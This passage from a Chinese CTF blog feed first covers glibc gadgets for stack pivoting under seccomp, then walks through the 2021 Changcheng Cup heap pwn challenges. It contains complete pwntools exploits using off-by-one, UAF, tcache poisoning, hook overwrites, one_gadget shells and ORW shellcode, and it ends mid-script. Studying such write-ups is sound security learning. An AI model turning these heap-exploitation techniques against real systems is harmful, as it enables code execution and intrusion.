[rdx+28h]<br>.text:00000000000581E1                 mov     r9, [rdx+30h]<br>.text:00000000000581E5                 mov     rdx, [rdx+88h]<br>.text:00000000000581EC                 xor     eax, eax<br>.text:00000000000581EE                 retn<br></code></pre></td></tr></table></figure><h3 id="gadget1"><a href="#gadget1" class="headerlink" title="gadget1"></a>gadget1</h3><p>这其中用到的 <code>gadget</code>是 <code>getkeyserv_handle+576</code>，其汇编如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov     rdx, [rdi+8]<br>mov     [rsp+0C8h+var_C8], rax<br>call    qword ptr [rdx+20h]<br></code></pre></td></tr></table></figure><p>这个 <code>gadget</code>可以通过 <code>rdi</code> 来控制 <code>rdx</code>， 非常好用，而且从 Glibc2.29到2.32都可用</p><p>控制 <code>rdx</code>之后，我们就可以通过 <code>setcontext</code>来控制其他寄存器了</p><h3 id="gadget2"><a href="#gadget2" class="headerlink" title="gadget2"></a>gadget2</h3><p>通过 gadget控制rbp的值，从而进行栈迁移，将栈劫持到我们可以控制的堆地址上，并执行预先布置的rop链，从而获取flag</p><p>先介绍一下万金油的gadget <code>svcudp_reply+26</code>，汇编如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rbp, qword ptr [rdi + 0x48]; <br>mov rax, qword ptr [rbp + 0x18]; <br>lea r13, [rbp + 0x10]; <br>mov dword ptr [rbp + 0x10], 0; <br>mov rdi, r13; <br>call qword ptr [rax + 0x28];<br></code></pre></td></tr></table></figure><p>这个gadgets主要是通过 <code>rdi</code>控制 <code>rbp</code>进而控制 <code>rax</code>并执行跳转，由于我们已经控制了 <code>rbp</code>的值，因此只需要在 <code>rax+0x28</code>的位置部署 <code>leave；ret</code>即可完成栈迁移</p><p>从而在我们已经布置好 <code>orw rop链</code>的位置伪造栈地址并劫持控制流，最终读取<code>flag</code></p><h3 id="gadget3"><a href="#gadget3" class="headerlink" title="gadget3"></a>gadget3</h3><p>在gadget2中是通过gadgets进行栈迁移，将原本的栈地址劫持到了堆上，但如果栈地址已知的话，解题过程会更加简单，而且不需要特意去寻找gadgets，那么如何泄露栈地址呢？其实程序的栈地址会存放在 <code>environ</code>中，我们只要输出<code>environ</code>的内容就能获取栈地址</p><p>来源：<a href="https://www.anquanke.com/post/id/236832">https://www.anquanke.com/post/id/236832</a></p><p>​            <a href="http://blog.eonew.cn/archives/993">http://blog.eonew.cn/archives/993</a></p><p>​            <a href="https://blog.csdn.net/A951860555/article/details/118268484">https://blog.csdn.net/A951860555/article/details/118268484</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;背景前置&quot;&gt;&lt;a href=&quot;#背景前置&quot; class=&quot;headerlink&quot; title=&quot;背景前置&quot;&gt;&lt;/a&gt;背景前置&lt;/h2&gt;&lt;p&gt;seccomp 是 secure computing 的缩写，其是 Linux kernel 从2.6.23版本引入的一种简</summary>
      
    
    
    
    
    <category term="orw" scheme="http://example.com/tags/orw/"/>
    
  </entry>
  
  <entry>
    <title>2021长城杯PWN</title>
    <link href="http://example.com/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/"/>
    <id>http://example.com/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/</id>
    <published>2021-09-21T04:07:10.000Z</published>
    <updated>2021-10-13T08:01:24.539Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这次一共三题pwn，两题其实都是比较常见的堆题，可惜只做出了一题，还有一题堆上的orw在比赛前没能出 。不过总的来说：比之前还是进步了很多，加油</p><h2 id="K1ng-in-h3Ap-I"><a href="#K1ng-in-h3Ap-I" class="headerlink" title="K1ng_in_h3Ap_I"></a>K1ng_in_h3Ap_I</h2><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161053043.png" alt="image-20210921161053043"></p><p>毫无疑问的64位，保护全开</p><p>程序一共有着三个功能以及一个好心送我们的三字节libc地址</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161202941.png" alt="image-20210921161202941"></p><p>输入666会打印出后三字节地址</p><p>申请堆块没有特殊的，只是不能申请大于0xF0的堆块</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161426698.png" alt="image-20210921161426698"></p><p>写入功能存在着offbyone，还要注意的就是交互要输入’\n’才能结束，否则就要输入完所有长度数据</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921161337239.png" alt="image-20210921161337239"></p><p>释放功能存在UAF</p><p>所以我的思路是借着offbyone生成unsorted chunk，得到libc地址，然后再将他分为一块大小为为0x70的fast chunk，借用UAF对着libc后三位进行覆盖，覆盖成stdout的地址，将堆块分配到stdout上，吐出libc地址。然后故技重施，再分配到__malloc_hook上，但是还要借用relloc调整一下才行</p><p>看了别人的wp，对于第一次把chunk分配到stdout还有别的思路：先释放一块unsorted chunk，然后申请回来0x70大小的fast chunk，此时这块chunk上也是会残留着libc地址（正常的malloc是不会清零的），然后释放两个fast chunk进入bin链，将后进的那块，借用UAF把fd指针修改成指向有着libc地址的那个chunk，这时也能将堆块申请到stdout上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input size:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span>(<span class="hljs-params">idx</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(idx))<br>p.recvuntil(<span class="hljs-string">&quot;input context:&quot;</span>)<br>p.sendline(content)<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x45226 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; \n&quot;</span>,<span class="hljs-string">&#x27;666&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;0x&quot;</span>)<br>addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">6</span>),<span class="hljs-number">16</span>) <br>log.success(<span class="hljs-built_in">hex</span>(addr))<br>stdout = (addr + <span class="hljs-number">0x36FE10</span>) &amp; <span class="hljs-number">0xFFFFFF</span><br>log.info(<span class="hljs-string">&quot;stdout==&gt;0x%x&quot;</span> %stdout)<br>low = stdout &amp; <span class="hljs-number">0xFFFF</span><br>high = (stdout &gt;&gt; <span class="hljs-number">16</span>) &amp;<span class="hljs-number">0xFF</span><br>log.info(<span class="hljs-string">&quot;low==&gt;0x%x&quot;</span> %low)<br>log.info(<span class="hljs-string">&quot;high==&gt;0x%x&quot;</span> %high)<br><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x68</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">1</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">2</span>,p16(low - <span class="hljs-number">0x43</span>) + p8(high))<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">6</span> + p64(<span class="hljs-number">0xfbad1800</span>) + p64(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + <span class="hljs-string">&#x27;\x00&#x27;</span> <br>edit(<span class="hljs-number">4</span>,payload)<br>p.recv(<span class="hljs-number">0x40</span>)<br>libc_base = u64(p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3c5600</span><br>log.info(<span class="hljs-string">&quot;libc_base==&gt;0x%x&quot;</span> %libc_base)<br>ogg = libc_base + <span class="hljs-number">0x4527a</span><br>mlh = libc_base + libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">4</span>,<span class="hljs-number">0x68</span>)<br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>p.recvuntil(<span class="hljs-string">&quot;input index:&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x28</span> + <span class="hljs-string">&#x27;\xa1&#x27;</span>)<br>free(<span class="hljs-number">2</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x28</span>)<br>edit(<span class="hljs-number">3</span>,p64(mlh - <span class="hljs-number">0x23</span>))<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x68</span>)<br>add(<span class="hljs-number">5</span>,<span class="hljs-number">0x68</span>)<br>realloc = libc_base + libc.sym[<span class="hljs-string">&#x27;__libc_realloc&#x27;</span>]<br>log.info(<span class="hljs-string">&quot;__libc_realloc==&gt;0x%x&quot;</span> %realloc)<br>payload = p8(<span class="hljs-number">0</span>)*<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>) + p64(ogg) + p64(realloc+<span class="hljs-number">16</span>)<br>edit(<span class="hljs-number">5</span>,payload)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x20</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="K1ng-in-h3Ap-II"><a href="#K1ng-in-h3Ap-II" class="headerlink" title="K1ng_in_h3Ap_II"></a>K1ng_in_h3Ap_II</h2><p>来源：<a href="https://blog.csdn.net/eeeeeight/article/details/120386415">https://blog.csdn.net/eeeeeight/article/details/120386415</a></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210921163803827.png" alt="image-20210921163803827"></p><p>常规checksec，64位保护全开。在程序上跟上题是差不多的，少了666的地址泄露以及offbyone漏洞，但是多了打印功能，以及libc版本提升至2.27，至于2.27，就是标志性的tcache bin</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922131449936.png" alt="image-20210922131449936"></p><p>然后申请的size只能是在0x10~0x60</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132037509.png" alt="image-20210922132037509"></p><p>UAF依然存在</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132136392.png" alt="image-20210922132136392"></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132215898.png" alt="image-20210922132215898"></p><p>多了一层沙箱，看到这个基本都是orw的思路：借用setcontext + 53上的gadgets，调用mprotect使得堆可执行，然后执行布置在堆上的rop链，读取flag</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922132710147.png" alt="image-20210922132710147"></p><p>申请0x50的堆块是因为链上没有0x60的空闲堆块，所以申请出来的堆块是在最底下的（与top chunk相近的）并且两块是连续的，好算偏移</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133019126.png" alt="image-20210922133019126"></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922133236908-16322992251781.png" alt="image-20210922133236908"></p><p>然后先后释放，借用UAF泄露出堆上地址，进而计算tcache地址</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162651147.png" alt="image-20210922162651147"></p><p>然后把我们之后要申请用到的堆块的count数量改为2，以及把unsorted chunk的count全部一次性改为7，为后续释放unsorted chunk进入bin链泄露libc基址做工作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#修改tcache bin</span><br>add(<span class="hljs-number">0</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">1</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">3</span>,<span class="hljs-number">0x60</span>)<br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>show(<span class="hljs-number">1</span>)<br>leak_heap=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>))<br>log.success(<span class="hljs-string">&#x27;leak heap: &#x27;</span>+<span class="hljs-built_in">hex</span>(leak_heap))<br>next_heap=leak_heap + <span class="hljs-number">0xc0</span><br>tc_addr=leak_heap - <span class="hljs-number">0xf60</span><br>log.success(<span class="hljs-string">&#x27;tc addr: &#x27;</span>+<span class="hljs-built_in">hex</span>(tc_addr))<br>free(<span class="hljs-number">3</span>)<br>edit(<span class="hljs-number">3</span>, p64(tc_addr))<br>add(<span class="hljs-number">4</span>, <span class="hljs-number">0x60</span>)<br>add(<span class="hljs-number">5</span>, <span class="hljs-number">0x60</span>)<br>payload = p64(<span class="hljs-number">0x200000002</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x0707070707070707</span>)*<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922162838313.png" alt="image-20210922162838313"></p><p>修改之前释放堆块的fd指针指向0x20堆块，而前面也修改了0x60堆块的count数量为2，所以可以申请，造成overlap，之后修改0x20堆块的size，申请0x30的堆块，（原因是这个大小的堆块是不存在空闲的堆块，所以可以全部相邻在一起，方便操作）。把底下的堆块都包含在内，记得要留一个防止与top chunk进行合并</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163245528.png" alt="image-20210922163245528"></p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922163344836.png" alt="image-20210922163344836"></p><p>然后释放得到libc地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#泄露libc基址</span><br>edit(<span class="hljs-number">5</span>, payload)<br>edit(<span class="hljs-number">1</span>, p64(next_heap))<br>add(<span class="hljs-number">0</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">1</span>, <span class="hljs-number">0x30</span>)<br>add(<span class="hljs-number">6</span>,<span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">7</span>,<span class="hljs-number">0x50</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span> + p64(<span class="hljs-number">0x141</span>)<br>edit(<span class="hljs-number">7</span>, payload)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_base = u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)) - <span class="hljs-number">0x3ebca0</span><br>log.success(<span class="hljs-string">&#x27;libc base: &#x27;</span>+ <span class="hljs-built_in">hex</span>(libc_base))<br></code></pre></td></tr></table></figure><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922165259157.png" alt="image-20210922165259157"></p><p>往free_hook里面写入setcontext+53的地址</p><p>然后根据<code>setcontext+53</code>上的寄存器布置环境：而rdi的值是我们等下要释放的堆块的地址，根据这个计算出偏移，在对应的地址为rdi，rsi，rdx设置参数，然后设置rcx的值为mprotect的地址，去执行mprotect，再跳转回来执行shellcode读取flag</p><p><img src="/2021/09/21/2021-09-21-2021%E9%95%BF%E5%9F%8E%E6%9D%AFPWN/image-20210922170913920.png" alt="image-20210922170913920"></p><p>成功读取flag！</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">8</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">9</span>, <span class="hljs-number">0x50</span>)<br>add(<span class="hljs-number">10</span>, <span class="hljs-number">0x50</span>) <br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>free(<span class="hljs-number">11</span>)<br>edit(<span class="hljs-number">11</span>, p64(free_hook))<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>)<br>add(<span class="hljs-number">11</span>, <span class="hljs-number">0x10</span>) <span class="hljs-comment">#free_hook</span><br>edit(<span class="hljs-number">11</span>, p64(setcontext))<br>shellcode_addr = tc_addr + <span class="hljs-number">0x1110</span><br>shellcode = asm(<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    mov rsi, 0x67616c662f2e</span><br><span class="hljs-string">    push rsi</span><br><span class="hljs-string">    mov rdi, rsp</span><br><span class="hljs-string">    mov rax, 2</span><br><span class="hljs-string">    xor rsi, rsi</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rdi, rax</span><br><span class="hljs-string">    xor rax, rax</span><br><span class="hljs-string">    mov rsi, rsp</span><br><span class="hljs-string">    mov rdx, 0x50</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string"></span><br><span class="hljs-string">    mov rax, 1</span><br><span class="hljs-string">    mov rdi, 1</span><br><span class="hljs-string">    syscall</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span>)<br>payload = p64(<span class="hljs-number">0</span>)*<span class="hljs-number">5</span>*<span class="hljs-number">2</span><br>edit(<span class="hljs-number">8</span>, payload)<br>payload = p64(<span class="hljs-number">0</span>) + p64(tc_addr-<span class="hljs-number">0x10</span>) + p64(<span class="hljs-number">0x10000</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x7</span>) <br>payload += p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0</span>) + p64(shellcode_addr) + p64(mprotect)<br>edit(<span class="hljs-number">9</span>, payload)<br>payload = p64(shellcode_addr + <span class="hljs-number">8</span>) + shellcode<br>edit(<span class="hljs-number">10</span>, payload)<br>free(<span class="hljs-number">8</span>)<br></code></pre></td></tr></table></figure><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!usr/bin/env python </span><br><span class="hljs-comment">#coding=utf-8</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/libc-2.27.so&quot;</span>)<br><span class="hljs-comment">#libc = ELF(&quot;./libc.so.6&quot;)</span><br>ld = ELF(<span class="hljs-string">&quot;/home/shoucheng/glibc-all-in-one/libs/2.27-3ubuntu1.4_amd64/ld-2.27.so&quot;</span>)<br>p = process(argv=[ld.path,elf.path],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libc.path&#125;)<br><span class="hljs-comment">#p = remote(&quot;47.104.175.110&quot;,61608)</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>():</span><br>gdb.attach(p,<span class="hljs-string">&quot;b main&quot;</span>)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">idx,size</span>):</span><br>p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; 